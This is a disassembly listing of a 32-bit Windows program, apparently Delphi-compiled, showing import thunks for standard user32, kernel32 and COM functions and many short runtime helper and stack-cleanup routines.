jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollPos
jmp [ SetScrollPos@IAT ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ __import_lookup_table_9(user32:TranslateMDISysAccel) ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_40699c
call GetTickCount
retn
sub_4069a4
xor eax eax
retn
sub_4069a8
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_4069b8
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_4069d4
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_4069e8
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406a20
call sub_406990
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406bfd
jmp sub_4038a0
sub_406c04
pop ebp
retn
sub_406c08
sub [ rw-data ] 0x1
retn
sub_406c35
jmp sub_4038a0
sub_406c3c
pop ebp
retn
sub_406c40
sub [ rw-data ] 0x1
retn
sub_406f45
jmp sub_4038a0
sub_406f4c
pop ebp
retn
sub_406f50
sub [ rw-data ] 0x1
retn
sub_407a0d
add eax 0xffffffd4
jmp sub_40cce4
sub_407a15
add eax 0xffffffd4
jmp sub_40cb8c
sub_407a1d
add eax 0xffffffd4
jmp sub_40cc28
sub_407a25
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405808
sub_407a2f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405830
sub_407a39
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405844
sub_407d68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407d30
test eax eax
sete al
pop esi
pop ebx
retn
sub_4082a0
call sub_40827c
retn
sub_408338
push eax
call CloseHandle
retn
sub_4084c0
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4084d4
push esi
mov esi eax
xchg edx eax
call sub_402930
mov eax esi
pop esi
retn
sub_408694
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_402734
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4086a8
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_4086e0
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402754
sub_408748
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402890
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40876c
push ebx
mov ebx eax
mov eax ebx
call sub_403e9c
pop ebx
retn
sub_408acf
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403e9c
pop eax
pop ebx
retn
sub_408d87
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408ee2
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40923f
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40923f
sub_4092fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40435c
mov edx esi
xor ecx ecx
call sub_409188
pop esi
pop ebx
retn
sub_409370
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40435c
mov edx esi
mov cl 0x1
call sub_409188
pop esi
pop ebx
retn
sub_4099ea
jmp sub_4038a0
sub_4099f1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ae2
jmp sub_4038a0
sub_409ae9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a28d
jmp sub_4038a0
sub_40a294
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a31c
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a2c0
pop ebp
retn 0x8
sub_40a461
jmp sub_4038a0
sub_40a468
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a90b
jmp sub_4038a0
sub_40a912
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ae2b
jmp sub_4038a0
sub_40ae32
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40aedd
jmp sub_4038a0
sub_40aee4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40af87
jmp sub_4038a0
sub_40af8e
pop esi
pop ecx
pop ebp
retn
sub_40b16a
jmp sub_4038a0
sub_40b171
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b1c8
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b4ba
jmp sub_4038a0
sub_40b588
jmp sub_4038a0
sub_40b5f8
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403118
sub_40b794
jmp sub_4038a0
sub_40b79b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b7a4
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_4038d8
sub_40b7b1
retn
sub_40b7b4
push ebp
mov ebp esp
call sub_40b6f8
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b7a4
pop ebp
retn 0x4
sub_40b7d0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
retn
sub_40b868
push ebx
mov ebx eax
mov eax ebx
call sub_40b7e8
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40ba3b
jmp sub_4038a0
sub_40ba42
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb07
jmp sub_4038a0
sub_40bb0e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb18
call sub_40b35c
mov eax 0x1
call sub_403e84
sub_40bc9c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bd75
jmp sub_4038a0
sub_40bd92
jmp sub_4038a0
sub_40bd99
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40be44
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bda8
mov ecx eax
sub_40c030
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c050
push eax
call CharNextA
retn
sub_40c274
jmp sub_4038a0
sub_40c27b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c2e4
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c73b
jmp sub_4038a0
sub_40c742
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40c880
jmp sub_4038a0
sub_40c887
pop ebx
mov esp ebp
pop ebp
retn
sub_40c88c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c7f0
sub_40c89c
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c8b8
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_402754
pop ebx
retn
sub_40c940
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c94c
xchg [ eax ] edx
mov eax edx
retn
sub_40c9ac
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40ca3c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cb54
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cb7c
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40cdf7
jmp sub_4038a0
sub_40cdfe
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40ce6c
jmp sub_4038a0
sub_40ce73
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce91
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40ce8a
jmp sub_4038a0
sub_40ce91
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d354
jmp sub_4038a0
sub_40d35b
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40d3d4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d43a
jmp sub_4038a0
sub_40d441
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d4a6
jmp sub_4038a0
sub_40d4ad
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d512
jmp sub_4038a0
sub_40d519
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d57e
jmp sub_4038a0
sub_40d585
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d5ea
jmp sub_4038a0
sub_40d5f1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d669
jmp sub_4038a0
sub_40d670
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d6dc
jmp sub_4038a0
sub_40d6e3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d74c
jmp sub_4038a0
sub_40d753
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d7c0
jmp sub_4038a0
sub_40d7c7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40db4d
jmp sub_4038a0
sub_40db54
pop ebp
retn
sub_40db58
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d81c
sub_40db69
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e18a
jmp sub_4038a0
sub_40e191
pop ecx
pop ebp
retn
sub_40e223
jmp sub_4038a0
sub_40e22a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e27a
jmp sub_4038a0
sub_40e281
pop ecx
pop ebp
retn
sub_40e313
jmp sub_4038a0
sub_40e31a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e36a
jmp sub_4038a0
sub_40e371
pop ecx
pop ebp
retn
sub_40e5b9
jmp sub_4038a0
sub_40e5c0
pop ebx
mov esp ebp
pop ebp
retn
sub_40e6d6
jmp sub_4038a0
sub_40e6dd
pop ecx
pop ebp
retn
sub_40e6e0
push ebx
mov ebx eax
mov eax ebx
call sub_40e978
mov [ ebx ] 0x1
pop ebx
retn
sub_40e978
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e8fc
retn
mov [ eax ] 0x0
retn
sub_40e98c
push eax
call sub_40e978
pop eax
retn
sub_40ebec
call sub_40eca0
retn
sub_40ed40
jmp sub_4038a0
sub_40ed47
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed8e
jmp sub_4038a0
sub_40ed95
pop ebx
pop ecx
pop ebp
retn
sub_40edda
jmp sub_4038a0
sub_40ede1
pop ebx
pop ecx
pop ebp
retn
sub_40ee26
jmp sub_4038a0
sub_40ee2d
pop ebx
pop ecx
pop ebp
retn
sub_40ee72
jmp sub_4038a0
sub_40ee79
pop ebx
pop ecx
pop ebp
retn
sub_40f23b
jmp sub_4038a0
sub_40f242
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f2dc
jmp sub_4038a0
sub_40f2e3
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f751
jmp sub_4035ec
sub_40f80c
jmp sub_4035ec
sub_40f8b3
jmp sub_4035ec
sub_40f9ac
jmp sub_4035ec
sub_40fa85
jmp sub_4035ec
sub_40fb6d
jmp sub_4035ec
sub_40fd2a
jmp sub_4038a0
sub_40fd31
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fd93
jmp sub_4038a0
sub_40fd9a
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410200
jmp sub_4035ec
sub_4102ef
jmp sub_4038a0
sub_4102f6
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410394
jmp sub_4038a0
sub_41039b
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4107ed
jmp sub_4038a0
sub_4107f4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41089d
jmp sub_4038a0
sub_4108a4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410dd9
jmp sub_4035ec
sub_410ee0
jmp sub_4038a0
sub_410ee7
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410ff1
jmp sub_4038a0
sub_410ff8
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411448
jmp sub_4038a0
sub_41144f
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411559
jmp sub_4038a0
sub_411560
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411aa6
jmp sub_4038a0
sub_411aad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411b51
jmp sub_4038a0
sub_411b58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b7a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404594
retn
sub_411b73
jmp sub_4038a0
sub_411b7a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411bd6
jmp sub_4038a0
sub_411bdd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411c59
jmp sub_4038a0
sub_41219f
jmp sub_4038a0
sub_4121a6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412239
jmp sub_4038a0
sub_412240
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41225d
lea eax [ ebp - 0x14 ]
call sub_40457c
retn
sub_412256
jmp sub_4038a0
sub_41225d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4122ba
jmp sub_4038a0
sub_4122c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412363
jmp sub_4038a0
sub_412380
jmp sub_4038a0
sub_412387
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4128e2
jmp sub_4038a0
sub_4128e9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41295a
jmp sub_4038a0
sub_412961
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412cec
push eax
call sub_40e978
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_412d00
push eax
call sub_40e978
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_412dd0
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40eca0
add esp 0x10
sub_41307a
jmp sub_4038a0
sub_413081
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4130c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e978
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_4130dc
mov edx 0x80020004
call sub_4130c4
retn
sub_41316d
jmp sub_4038a0
sub_413174
pop esi
pop ebx
pop ebp
retn
sub_413178
push ebp
mov ebp esp
call sub_413338
pop ebp
retn 0x4
sub_413204
push ebp
mov ebp esp
call sub_413338
pop ebp
retn 0x4
sub_4132e7
jmp sub_4038a0
sub_4132ee
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403154
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034c0
sub_413310
xor eax eax
retn
sub_413314
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_413328
mov [ ecx ] 0x8
mov al 0x1
retn
sub_413330
call sub_40e140
retn
sub_413338
call sub_40e230
retn
sub_413340
call sub_40e68c
retn
sub_413348
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41335c
call sub_413338
retn
sub_413364
push ebp
mov ebp esp
call sub_413340
pop ebp
retn 0x8
sub_41337c
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_413458
jmp sub_4038a0
sub_413521
jmp sub_4038a0
sub_413528
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413545
lea eax [ ebp - 0x10 ]
call sub_403e9c
retn
sub_41353e
jmp sub_4038a0
sub_413545
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413550
call sub_40e6e0
retn
sub_4135c7
jmp sub_4038a0
sub_4135ce
pop ebp
retn
sub_413671
jmp sub_4038a0
sub_413678
pop ebp
retn
sub_413789
jmp sub_4038a0
sub_413790
pop ebp
retn
sub_413794
sub [ rw-data ] 0x1
retn
sub_4137c8
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_413a4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403ef0
pop esi
pop ebx
retn
sub_413ae8
jmp sub_4038a0
sub_413aef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413bea
jmp sub_4038a0
sub_413bf1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413df0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40eca0
pop esi
pop ebx
retn
sub_413f72
jmp sub_4038a0
sub_413f79
pop ebp
retn
sub_413f7c
sub [ rw-data ] 0x1
retn
IsEqualGUID
jmp [ IsEqualGUID@IAT ]
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
StringFromCLSID
jmp [ StringFromCLSID@IAT ]
ProgIDFromCLSID
jmp [ ProgIDFromCLSID@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ GetErrorInfo@IAT ]
sub_41405d
jmp sub_4038a0
sub_414064
pop ebp
retn
sub_414068
sub [ rw-data ] 0x1
retn
sub_41510e
inc ecx
add [ eax ] dh
rol [ ecx ] 0x1
cwde
rol [ ecx ] 0x1
add cl dl
inc ecx
add [ ecx + edx * 8 - 0x2e17ffbf ] al
inc ecx
add al ch
rol [ ecx ] cl
hlt
sub_4156d4
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4157f8
mov eax [ eax + 0xc ]
call sub_4169bc
retn
sub_415acf
jmp sub_4038a0
sub_415ad6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415adc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_416b74
test eax eax
setge al
pop esi
pop ebx
retn
sub_415ddf
jmp sub_4038a0
sub_415de6
mov esp ebp
pop ebp
retn
sub_415eb4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_415ec0
push ebx
mov ebx edx
mov edx ebx
call sub_415cd4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_415a34
sub_415f6c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4160c7
jmp sub_4038a0
sub_41619b
jmp sub_4038a0
sub_4161ac
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_416218
jmp sub_4038a0
sub_41621f
pop ebx
mov esp ebp
pop ebp
retn
sub_41626a
jmp sub_4038a0
sub_416271
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4162fd
jmp sub_4038a0
sub_416304
pop ebx
pop ebp
retn
sub_41634a
jmp sub_4038a0
sub_416351
pop ebx
pop ebp
retn
sub_416396
jmp sub_4038a0
sub_41639d
pop ebx
pop ebp
retn
sub_4163e7
jmp sub_4038a0
sub_4163ee
pop esi
pop ebx
pop ebp
retn
sub_416442
jmp sub_4038a0
sub_416449
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_416576
jmp sub_4038a0
sub_41664c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_416c5c
sub_41673c
jmp sub_4038a0
sub_4168c6
jmp sub_4038a0
sub_4168cd
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416967
jmp sub_4038a0
sub_41696e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41698d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416986
jmp sub_4038a0
sub_41698d
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4169f0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_416cb8
xor edx edx
mov eax ebx
call sub_416c7c
pop ebx
retn
sub_416a68
mov eax [ ebp + 0x4 ]
retn
sub_416a9e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_416aec
jmp sub_4038a0
sub_416af3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416af8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_416b10
xor edx edx
call sub_416b18
retn
sub_416c00
mov edx [ eax + 0x8 ]
dec edx
call sub_416b18
retn
sub_416d28
retn
sub_416de2
jmp sub_4038a0
sub_416de9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034c0
sub_416e78
jmp sub_4038a0
sub_416e7f
pop ebx
pop ecx
pop ebp
retn
sub_416e84
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_416edb
jmp sub_4038a0
sub_416ee2
pop ebx
pop ecx
pop ebp
retn
sub_416ee8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_416f24
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
retn
sub_416f3c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_417017
retn
sub_4170bc
test edx edx
je r-xdata
xor edx edx
call sub_4170d0
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_417186
jmp sub_4038a0
sub_41718d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4171a0
xchg edx eax
call sub_4170d0
retn
sub_4171a8
retn
sub_417241
jmp sub_4038a0
sub_417248
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417392
jmp sub_4038a0
sub_4174a2
jmp sub_4038a0
sub_4174a9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4174c6
lea eax [ ebp - 0xc ]
call sub_403e9c
retn
sub_4174bf
jmp sub_4038a0
sub_4174c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417550
jmp sub_4038a0
sub_417568
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_417624
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4176cd
jmp sub_4038a0
sub_4176d4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4176e0
mov eax [ ebp + 0x4 ]
retn
sub_417716
pop ecx
pop edx
pop esi
pop ebx
retn
sub_417764
jmp sub_4038a0
sub_41776b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41782a
jmp sub_4038a0
sub_417831
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417853
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ec0
retn
sub_41784c
jmp sub_4038a0
sub_417853
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41785c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_417864
xor eax eax
retn
sub_4178ad
jmp sub_4038a0
sub_4178b4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4179c7
jmp sub_4038a0
sub_4179ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417a5c
jmp sub_4038a0
sub_417a63
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417b33
jmp sub_4038a0
sub_417b3a
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417bf0
jmp sub_4038a0
sub_417bf7
pop esi
pop ecx
pop ebp
retn
sub_417c7c
jmp sub_4038a0
sub_417c83
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ca0
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
sub_417c99
jmp sub_4038a0
sub_417ca0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417d2c
jmp sub_4038a0
sub_417d49
jmp sub_4038a0
sub_417d50
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417d8c
retn
sub_417e0f
jmp sub_4038a0
sub_417e16
mov eax [ ebp - 0x8 ]
call sub_41a950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
